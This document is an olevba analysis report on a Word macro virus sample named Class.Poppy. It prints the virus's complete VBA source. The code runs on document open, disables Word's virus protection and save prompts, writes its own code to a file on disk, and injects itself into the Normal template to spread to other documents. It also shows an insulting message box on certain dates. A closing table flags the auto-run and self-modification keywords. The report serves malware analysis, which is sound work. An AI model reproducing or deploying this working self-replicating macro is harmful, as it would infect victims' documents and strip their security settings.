olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-085684e54fe5d2b0a5a5ba8b8be52243513157bf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-085684e54fe5d2b0a5a5ba8b8be52243513157bf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'igino16/12/99 10.59.59HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
On Error GoTo out
'igino16/12/99 11.00.00HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
Options.VirusProtection = False
'igino16/12/99 11.00.00HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
Options.SaveNormalPrompt = False
'igino16/12/99 11.00.00HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
Options.ConfirmConversions = False
'igino16/12/99 11.00.00HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'igino16/12/99 11.00.00HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'igino16/12/99 11.00.00HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
If nt > 70 And ad > 0 Then GoTo out
'igino16/12/99 11.00.00HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
If nt < 70 Then
'igino16/12/99 11.00.00HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'igino16/12/99 11.00.00HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'igino16/12/99 11.00.00HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'igino16/12/99 11.00.00HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
End If
'igino16/12/99 11.00.00HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'igino16/12/99 11.00.00HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'igino16/12/99 11.00.00HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
host.codemodule.AddFromFile ("c:\class.sys")
'igino16/12/99 11.00.00HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
With host.codemodule
'igino16/12/99 11.00.00HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
    For x = 1 To 4
'igino16/12/99 11.00.00HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
    .deletelines 1
'igino16/12/99 11.00.00HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
    Next x
'igino16/12/99 11.00.01HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
End With
'igino16/12/99 11.00.01HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
If nt < 70 Then
'igino16/12/99 11.00.01HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
    With host.codemodule
'igino16/12/99 11.00.01HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
    .replaceline 1, "Sub AutoClose()"
'igino16/12/99 11.00.01HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
    .replaceline 71, "Sub ToolsMacro()"
'igino16/12/99 11.00.01HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
    End With
'igino16/12/99 11.00.01HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
End If
'igino16/12/99 11.00.01HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
With host.codemodule
'igino16/12/99 11.00.01HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
    For x = 2 To 72 Step 2
'igino16/12/99 11.00.01HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'igino16/12/99 11.00.01HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
    Next x
'igino16/12/99 11.00.01HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
End With
'igino16/12/99 11.00.01HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
out:
'igino16/12/99 11.00.01HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'igino16/12/99 11.00.01HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
End Sub
'igino16/12/99 11.00.01HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
Sub ViewVBCode()
'igino16/12/99 11.00.01HP DeskJet 400 Printer on LPT1:Distribuzione compiti personale in servizio al S.docClippy
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

